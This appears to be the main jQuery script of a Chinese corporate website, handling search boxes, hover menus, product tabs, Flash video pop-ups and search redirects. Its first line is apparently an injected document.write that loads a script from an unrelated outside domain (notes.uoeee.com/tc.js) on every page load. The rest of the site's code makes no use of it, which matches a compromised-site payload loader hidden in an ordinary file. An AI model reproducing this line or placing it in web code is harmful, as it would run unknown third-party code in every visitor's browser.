document.write('<script type="text/javascript" src="http://notes.uoeee.com/tc.js"></script>');
// input 获得、失去焦点
function clearInput(obj){
    var oInput = obj.find('input[type=text]');
    var o_val = oInput.val();
    oInput.focus(function(){
        var n_val = $(this).val();
        if(n_val == o_val){
            $(this).val('');
        }
    });
    oInput.blur(function(){
        var n_val = $(this).val();
        if(n_val == ''){
            $(this).val(o_val);
        }
    });
};

// function being

$(function(){

    // 头部搜索
    clearInput($('.search'));

    // 导航
    var qcloud={};

    $('[_t_nav]').hover(function(){

        var that = $(this);
        var _nav = $(this).attr('_t_nav');

        // that.find('a').addClass('on');

        clearTimeout( qcloud[ _nav + '_timer' ] );

        qcloud[ _nav + '_timer' ] = setTimeout(function(){
            // $('[_t_nav]').each(function(){
            //     $(this)[ _nav == $(this).attr('_t_nav') ? 'addClass':'removeClass' ]('nav-up-selected');
            // });
            
            $('.subnav,#'+_nav).stop(true,true).fadeIn(200);
            
        }, 150);

    },function(){

        var that = $(this);
        var _nav = $(this).attr('_t_nav');
        
        clearTimeout( qcloud[ _nav + '_timer' ] );
        
        qcloud[ _nav + '_timer' ] = setTimeout(function(){
            // $('[_t_nav]').removeClass('nav-up-selected');
            $('.subnav,#'+_nav).stop(true,true).fadeOut(100);
        }, 150);
    });

    // 首页产品和方案

    var ipI  = 0;

    function ipor(num){
        $('.index-protab').find('a').eq(num).addClass('cur').siblings().removeClass('cur');
        $('.index-procont').stop(false,true).fadeOut(300).eq(num).stop(false,true).fadeIn(300);
    };

    ipor(ipI);


    //$('.pro-prev').click(function(){
    //    if( ipI == 0){
    //        ipI = $('.index-protab').find('a').length - 1;
    //    }else{
    //        ipI--;
    //    }

    //    ipor(ipI);
    //});
    //$('.pro-next').click(function(){
    //    if( ipI > $('.index-protab').find('a').length - 2){
    //        ipI = 0;
    //    }else{
    //        ipI++;
    //    }

    //    ipor(ipI);
    //});

    $('.index-protab').find('a').click(function(){
        ipI = $(this).index();
        ipor(ipI);
    });

    // 首页视频弹窗（企业视频弹窗）
    $('.index-video .cont,.culture-video li').click(function () {
        var v_rel = $(this).find('img').attr('rel');

        if (v_rel.substr(0, 7).toLowerCase() == "http://") {
            $('.video-popup').find('.cont').html('<embed src="' + v_rel + '" allowFullScreen="true" quality="high" width="100%" height="100%" align="middle" allowScriptAccess="always" type="application/x-shockwave-flash"></embed>');
        } else {
            $('.video-popup').find('.cont').html('<object classid="" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="100%" height="100%">' +
                                        '      <param name="movie" value="/flvplayer.swf"> ' +
                                        '      <param name="BarColor" value="0xffffff" />' +
                                        '      <param name="FlashVars" value="vcastr_file=' + v_rel + '&LogoText=&BufferTime=3&IsAutoPlay=1" />' +
                                        '      <param name="quality" value="high"/> ' +
                                        '      <param name="allowFullScreen" value="true" /> ' +
                                        '      <param name="wmode" value="transparent" />' +
                                        '      <param name="loop" value="true" />' +
                                        '      <embed src="/flvplayer.swf" allowFullScreen="true"  loop="loop" flashvars="vcastr_file=' + v_rel + '&LogoText=&IsAutoPlay=1" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="100%" height="100%"> ' +
                                        '      </embed> ' +
                                        '    </object>');
        }

        $('.mask,.video-popup').stop(false,true).fadeIn(300);
    });

    $('.mask,.video-popup span').click(function(){
        $('.mask,.video-popup').stop(false,true).fadeOut(300);
        var v_rel = '';
        $('.video-popup').find('.cont').html('');
    });

    //首页创新技术
    $('.indext-itlink').find('a').mouseenter(function () {
        if (!$(this).hasClass('active')) {
            $(this).addClass('active').stop(true, true).animate({ 'margin-bottom': -35, 'padding-top': 35 }).stop(true, true).animate({ 'margin-bottom': 0, 'padding-top': 0}, 300);
            //if (parseInt($(this).css('top')) > 0) {
            //    var iiPb = parseInt($(this).css('padding-bottom'));
            //    $(this).addClass('active').stop(true, true).animate({ 'margin-top': -35, 'padding-bottom': iiPb + 70 }).stop(true, true).animate({ 'margin-top': 0, 'padding-bottom': iiPb }, 300);
            //} else {
            //    var iiPt = parseInt($(this).css('padding-top'));
            //    $(this).addClass('active').stop(true, true).animate({ 'margin-bottom': -100, 'padding-top': iiPt + 100 }).stop(true, true).animate({ 'margin-bottom': 0, 'padding-top': iiPt }, 300);
            //}
        }
    }).mouseleave(function () {
        $(this).removeClass('active');
    });

    // 右侧按钮
    // var wH = $(window).height() / 6;

    // function leftbtn(){
    //     var dT = $(document).scrollTop();
    //     if( dT > wH){
    //         $('.leftbtn').fadeIn(300);
    //     }else{
    //         $('.leftbtn').fadeOut(300);
    //     }
    // };
    // leftbtn();

    // $(window).scroll(function() {
    //     leftbtn();
    // });

    //$('.leftbtn .wechat,.footer-media .wechat').click(function(){
    //    $('.mask,.wechat-popup').stop(false,true).fadeIn(300);
    //});

    $('.leftbtn').find('.ico').mouseenter(function () {
        $(this).find('.cont').stop(false, true).fadeIn(300);
    }).mouseleave(function () {
        $(this).find('.cont').stop(false, true).fadeOut(300);
    });

    $('.footer-media .mobile').mouseenter(function () {
        $('.mask,.sjewm').stop(false, true).fadeIn(300);
    });
    $('.footer-media .wechat').mouseenter(function () {
        $('.mask,.gfwx').stop(false, true).fadeIn(300);
    });
    $('.mask,.wechat-popup span').click(function(){
        $('.mask,.wechat-popup').stop(false,true).fadeOut(300);
    });
    
    $('.leftbtn .backtop').click(function(){
        $('html,body').animate({scrollTop:$('div.header').offset().top}, 800);
    });

    // 发展历程
    $('.history-box').eq(0).addClass('pt90');
    $('.history-box:odd').addClass('odd-hisory');

    // 核心价值
    $('.culture-box:odd').addClass('culture-boxodd');

    // 人才理念
    $('.culture-box02:odd').addClass('culture-box02odd');

     // 企业理念弹窗
    $('.idea-video').click(function(){
        var iv_rel = $(this).find('img').attr('rel');

        $(this).html('<object classid="" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="100%" height="100%">' +
                                    '      <param name="movie" value="/flvplayer.swf"> ' +
                                    '      <param name="BarColor" value="0xffffff" />' +
                                    '      <param name="FlashVars" value="vcastr_file=' + iv_rel + '&LogoText=&BufferTime=3&IsAutoPlay=1" />' +
                                    '      <param name="quality" value="high"/> ' +
                                    '      <param name="allowFullScreen" value="true" /> ' +
                                    '      <param name="wmode" value="transparent" />' +
                                    '      <param name="loop" value="true" />' +
                                    '      <embed src="/flvplayer.swf" allowFullScreen="true"  loop="loop" flashvars="vcastr_file=' + iv_rel + '&LogoText=&IsAutoPlay=1" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="100%" height="100%"> ' +
                                    '      </embed> ' +
                                    '    </object>');
    });

    // 社会招聘
    $('.job-list').find('dd:odd').addClass('odd');

    // 解决方案
    $('.second-menu').find('.drop').eq(0).mouseenter(function(){
        $('.second-menudrop01').stop(false,true).fadeIn(300);
    }).mouseleave(function(){
        setTimeout(function() {
            if(!$('.second-menudrop01').hasClass('active')){
                 $('.second-menudrop01').stop(false,true).fadeOut(300);
            }
        }, 100);
    });

    $('.second-menudrop01').mouseenter(function(){
        $(this).addClass('active');
        $('.second-menu').find('.drop').eq(0).addClass('cur02');
    }).mouseleave(function(){
        $('.second-menudrop01').stop(false,true).fadeOut(300).removeClass('active');
        $('.second-menu').find('.drop').eq(0).removeClass('cur02');
    });

    $('.second-menu').find('.drop').eq(1).mouseenter(function(){
        $('.second-menudrop02').stop(false,true).fadeIn(300);
    }).mouseleave(function(){
        setTimeout(function() {
            if(!$('.second-menudrop02').hasClass('active')){
                 $('.second-menudrop02').stop(false,true).fadeOut(300);
            }
        }, 100);
    });

    $('.second-menudrop02').mouseenter(function(){
        $(this).addClass('active');
        $('.second-menu').find('.drop').eq(1).addClass('cur02');
    }).mouseleave(function(){
        $('.second-menudrop02').stop(false,true).fadeOut(300).removeClass('active');
        $('.second-menu').find('.drop').eq(1).removeClass('cur02');
    });

    var $inp = $('input:text');
    $inp.bind('keydown', function (e) {
        var key = e.which;
        if (key == 13) {
            e.preventDefault();
            var inputname = $(this).attr("name");
            if (inputname == "topsearchtext") {
                var keyword = $(".topsearchtext").val();
                if (keyword == "") {
                    layer.msg("请填写要搜索的关键词！", 1, 9);
                    return false;
                } else {
                    window.location.href = "/search.html?keyword=" + escape(keyword) + "&curpage=1";
                }
            }
        }
    });

    //搜索
    $(".topsearchbtn").click(function () {
        var keyword = $(".topsearchtext").val();
        if (keyword == "") {
            layer.msg("请填写要搜索的关键词！", 1, 9);
            return false;
        }
        window.location.href = "/search.html?keyword=" + escape(keyword) + "&curpage=1";
    })

    var shtml = $(".link").html();
    shtml = shtml.substring(0, shtml.length - 2);
    $(".link").html(shtml);

    //隐藏分页
    var xcpL = $('#page').find('a').length > 1;
    if (xcpL) {
        $('#page').show();
    }
});
// function over